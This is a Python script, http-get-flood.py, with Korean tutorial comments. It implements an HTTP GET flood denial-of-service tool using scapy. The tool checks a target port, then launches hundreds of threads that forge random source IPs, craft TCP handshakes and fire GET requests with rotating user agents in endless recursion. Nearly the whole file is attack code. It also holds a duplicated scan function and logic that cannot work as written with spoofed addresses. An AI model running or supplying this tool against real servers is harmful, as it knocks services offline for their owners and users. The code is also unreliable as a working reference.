#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from scapy.layers.inet import IP, TCP
from threading import Thread
from datetime import datetime
import argparse
import socket
import subprocess
import sys
import random
import string

useragents = [
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
    "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
    "Opera/9.20 (Windows NT 6.0; U; en)",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
    "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
    # maybe not
    "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
]


def scan(dst_ip, dst_port):
    subprocess.call('clear', shell=True)
    t1 = datetime.now()
    remoteIP = socket.gethostbyname(dst_ip)

    print("-" * 60)
    print("Please wait, scanning remote host", remoteIP)
    print("-" * 60)
    try:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteIP, dst_port))
            if result == 0:
                print("Port {}:  Open".format(dst_port))
                return True
            else:
                return False
            sock.close()

        except KeyboardInterrupt:
            print("You pressed Ctrl+C")
            sys.exit()
        except socket.gaierror:
            print('Hostname could not be resolved. Exiting')
            sys.exit()
        except socket.error:
            print("Couldn't connect to server")
            sys.exit()
    except:
        print('error')
    t2 = datetime.now()
    total = t2 - t1
    print('Scanning Completed in: ', total)


class getflooding(Thread):
    def __init__(self, dst_ip, port, url):
        Thread.__init__(self)
        self.url = url
        self.dst_ip = dst_ip
        self.port = port
        self.intercount = 0
        self.running = True

    def header(self):
        # HTTP 헤더 정의
        self.src_IP = RandIP()
        # 랜덤한 IP 값을 인자로 받아온다.
        self.req_header = 'GET {} HTTP/1.1\r\n'.format(self.url)
        self.req_header += 'Host : {}\r\n'.format(self.src_IP)
        self.req_header += 'User-Agent: {}\r\n'.format(
            random.choice(useragents))
        # useragent 리스트 값에서 랜덤으로 한개를 선택하여 가져온다.
        self.req_header += 'Cache-Control : no-cache\r\n'
        self.req_header += '\r\n'
        # 끝에 개행문자열을 추가

        return self.req_header, self.src_IP
        # 헤더와 IP 주소 값을 리턴한다.

    def run(self):
        try:
            print('Packet Sent :'+str(self.intercount))

            self.req_head, self.src_IP = self.header()
            # 리턴된 헤더값과 IP값
            self.src_port = int(RandShort())
            # 랜덤한 port값을 받아오는데 이때 반드시 int를 붙이도록한다. int를 안붙이고 RandShort만 할 시
            # 아래에서 패킷을 보낼때마다 self.src_port를 정의할 경우 매번 새로운 Port 값을 가져오므로 세션이 성립이 안된다.

            # 이부분 부터는 #3way handshake를 이해하여야한다.
            self.syn = IP(src=self.src_IP, dst=self.dst_ip) / \
                TCP(sport=self.src_port, dport=self.port, flags='S')
            # .syn 요청
            # IP
            # src= 리턴된 IP 주소 값
            # dst= 웹 서버 IP 주소 값
            # TCP
            # sport= 랜덤한 포트 값
            # dport= 웹서버 포트 값
            # flags='S' SYN 패킷을 전송함

            self.syn_ack = sr1(self.syn)
            # syn+ack 즉, 서버의 첫 응답 값
            # sr1은 방금 위의 SYN 패킷을 전송한 것에 대한 첫번째 응답값을 가져온다.
            # 때문에, 이 응답값은 웹서버가 보낸 SYN+ACK이다.

            self.ack = IP(src=self.src_IP, dst=self.dst_ip)/TCP(sport=self.src_port, dport=self.port,
                                                                seq=self.syn_ack[TCP].ack, ack=self.syn_ack[TCP].seq+1)/self.req_head
            # ACK 3way-handshake
            # IP
            # src= 리턴된 IP 주소 값
            # dst= 웹 서버 IP 주소 값
            # TCP
            # sport= 랜덤한 포트 값
            # dport= 웹서버 포트 값
            # seq= sequence Number로 ACK 패킷을 전송할 때 몇으로 설정하여서 보낼지 결정한다.
            # 위 SYN+ACK의 응답값에 ack가 1001이였으면 ACK의 seq는 1001 그대로 전송하면된다.
            # ack= Ack Number로 ACK 패킷을 전송할 때 몇으로 설장하여서 보낼지 결정한다.
            # 위 SYN+ACK의 응답값에 seq가 2000이였다면 ACK의 ack는 2000+1로 전송하면된다.

            print('*'*30, 'Sending ACK packet', '*'*30)
            send(self.ack)
            # ack패킷 전송
            print('*'*30, 'Done!', '*'*30)
            self.intercount += 1
            self.run()

        except:
            print('*'*30, 'ERROR', '*'*30)
            print('*'*30, 'RESTART', '*'*30)
            self.run()


def arg_userage():
    print("-" * 60)
    print("./http-get-flood.py")
    print(" -i|--target IP <Hostname|IP>")
    print(" -u|--target URL")
    print(" -p|--target PORT")
    print(" -t|--threads <Number of Multi Run threads> Defaults to 256")
    print(" -h|--help Shows \n")
    print("Ex, ./http-get-flood.py -i 192.168.1.100 -u www.naver.com/index.html -p 80 -t 10000 \n")
    print("-" * 60)
    time.sleep(5)


def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', type=str, help='--target IP <Hostname|IP>')
    parser.add_argument('-u', type=str, help='--target URL')
    parser.add_argument('-p', type=int, help='--target PORT')
    parser.add_argument(
        '-t', type=int, help='--threads <Number of Multi Run threads> Defaults to 256', default=256)
    args = parser.parse_args()
    return args


def main(dst_ip, port, url, threads):
    port_check = scan(dst_ip, port)
    if port_check == True:
        for get in range(threads):
            get = getflooding(dst_ip, port, url)
            get.start()

    elif port_check == False:
        print('Port No Open...')


if __name__ == '__main__':
    arg_userage()
    args = parse()
    if args.i:
        host = args.i
    if args.u:
        url = args.u
    if args.p:
        port = args.p
    if args.t:
        threads = args.t
    main(host, port, url, threads)


def scan(dst_ip, dst_port):
    subprocess.call('clear', shell=True)
    # os.system과 같이 단순히 실행만 하고자 할 경우에는 call 메소드를 이용한다.
    # 즉, 위 clear 명령어는 우분투에서 실행 시 clear 명령어를 입력해주어 화면을 클린한 상태로 만들어준다.
    t1 = datetime.now()
    # 스캐닝에 대한 경과 시간이 얼마나 되었는지 체크하기 위함이다.
    remoteIP = socket.gethostbyname(dst_ip)
    # gethostbyname은 hostname을 IPv4 스트링 값으로 반환하여 준다.

    print("-" * 60)
    print("Please wait, scanning remote host", remoteIP)
    print("-" * 60)
    try:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # TCP 소켓 객체 생성
            result = sock.connect_ex((remoteIP, dst_port))
            # connect_ex는 해당 IP,port를 튜플 값으로 받아들인 뒤 연결이 성공하면 0을 반환하고 실패할 시에 1을 반환한다.
            if result == 0:
                # 연결이 성공했다면
                print("Port {}:  Open".format(dst_port))
                return True
            else:
                return False
            sock.close()

        except KeyboardInterrupt:
            print("You pressed Ctrl+C")
            sys.exit()
        except socket.gaierror:
            print('Hostname could not be resolved. Exiting')
            sys.exit()
        except socket.error:
            print("Couldn't connect to server")
            sys.exit()
    except:
        print('error')
    t2 = datetime.now()
    # 스캔이 끝나고의 현재시점의 시간을 기록한다.
    total = t2 - t1
    # 스캔이 시작하기 전과 스캔이 끝났을 때의 차이를 계산하여 출력한다.
    print('Scanning Completed in: ', total)
